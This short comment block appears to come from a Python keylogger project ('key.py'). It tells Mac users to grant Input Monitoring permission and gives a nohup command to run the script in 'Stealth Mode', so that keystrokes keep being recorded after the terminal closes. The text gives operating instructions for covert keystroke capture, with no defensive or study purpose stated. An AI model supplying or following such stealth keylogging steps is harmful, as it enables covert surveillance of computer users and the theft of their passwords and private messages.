# PERMISSIONS FOR MAC:
# For Windows, the program should work like a charm. But in case you are a Mac user â€” Go to Settings > Security & Privacy > Privacy > Input Monitoring and tick the checkbox in front of the Terminal or the IDE you are working on.

# How to run Script in Stealth Mode: ( This will let the code run even after the terminal closes while still recording the keystrokes )

# [Linux] - " nohup python3 key.py & "
